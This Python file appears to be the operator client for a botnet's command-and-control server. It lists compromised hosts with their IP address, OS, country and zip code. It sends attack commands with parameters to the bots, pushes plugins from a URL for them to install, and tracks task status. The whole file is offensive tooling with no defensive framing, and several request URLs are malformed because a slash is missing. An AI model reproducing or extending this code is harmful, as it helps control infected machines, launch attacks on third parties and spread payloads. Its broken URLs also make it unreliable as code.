#!/usr/bin/env python

import requests
import time
import json


class Operations:
    @staticmethod
    def list(host, port):
        bot_list = []
        r = requests.get('http://' + host + ':' + port + '/knight/list')
        if r.status_code != 200 or r.headers['content-type'] != 'application/json':
            print('ERROR: ' + r.text)
            return -1
        current = time.time()
        for bot in json.loads(r.text):
            item = {'id': bot['id'], 'lastSeen': int(current - bot['lastSeen'] / 1000)}
            for key in bot['properties']:
                item[key] = bot['properties'][key]
            bot_list.append(item)
        return bot_list

    @staticmethod
    def list_alive(host, port, since):
        bot_list = []
        r = requests.get('http://' + host + ':' + port + '/knight/list/' + since)
        if r.status_code != 200 or r.headers['content-type'] != 'application/json':
            print('ERROR: ' + r.text)
            return -1
        current = time.time()
        for bot in json.loads(r.text):
            item = {'id': bot['id'], 'lastSeen': int(current - bot['lastSeen'] / 1000)}
            for key in bot['properties']:
                item[key] = bot['properties'][key]
            bot_list.append(item)
        return bot_list

    @staticmethod
    def sort(bot_list, key):
        return sorted(bot_list, key=lambda k: k[key])

    @staticmethod
    def print_list(bot_list):
        properties = ['id', 'ipAddress', 'lastSeen', 'os', 'countryCode', 'zip']
        print("ID ADDRESS LASTSEEN OS COUNTRY ZIP")
        for bot in bot_list:
            for key in properties:
                if key in bot:
                    print('\'' + str(bot[key]) + "\' ", end='')
                else:
                    print('\'\'', end='')
            print()

    @staticmethod
    def post_attack(host, port, attack, param):
        r = requests.post('http://' + host + ':' + port + '/control/run',
                          json={'command': attack, 'parameters': param},
                          headers={'content-type': 'application/json'})
        if r.status_code != 200:
            print('ERROR: ' + r.text)
            return -1
        print(r.text)

    @staticmethod
    def hash_args(args):
        param = {}
        for element in args:
            if len(element.split(':')) < 2:
                return -1
            key = str(element.split(':')[0])
            value = str(':'.join(element.split(':')[1:]))
            param[key] = value
        return param

    @staticmethod
    def install(host, port, url):
        r = requests.post('http://' + host + ':' + port + 'control/plugin', url)
        if r.status_code != 200:
            print('ERROR: ' + r.text)
            return -1
        print(r.text)

    @staticmethod
    def status(host, port, task_id):
        r = requests.post('http://' + host + ':' + port + 'control/status', task_id)
        if r.status_code != 200:
            print('ERROR: ' + r.text)
            return -1
        return json.loads(r.text)

    @staticmethod
    def block(response):
        if response == -1 or response['status'] == 'complete':
            return False
        return True

    @staticmethod
    def clear(host, port, task_id):
        r = requests.post('http://' + host + ':' + port + 'control/clear', task_id)
        if r.status_code != 200:
            print('ERROR: ' + r.text)
            return -1
        return json.loads(r.text)
